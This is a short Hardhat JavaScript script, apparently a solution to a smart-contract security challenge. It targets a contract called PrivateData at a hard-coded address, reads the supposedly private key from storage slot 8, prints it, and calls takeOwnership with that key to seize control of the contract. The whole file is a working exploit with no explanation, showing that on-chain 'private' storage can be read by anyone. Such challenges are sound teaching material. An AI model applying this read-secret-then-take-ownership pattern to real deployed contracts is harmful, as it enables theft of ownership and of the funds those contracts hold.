const hre = require("hardhat");
const { ethers } = hre;

const address = '0x620e0c88e0f8f36bcc06736138bded99b6401192';

async function main() {
  // private key is in slot 8
  const privateKey = await ethers.provider.getStorageAt(address, 8);
  console.log('PrivateKey: ', privateKey);

  const PrivateData = await ethers.getContractFactory("PrivateData");
  const instance = PrivateData.attach(address);

  const tx = await instance.takeOwnership(privateKey);
  console.log('TX: ', tx.hash);

  await tx.wait();
  console.log('Done!');
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
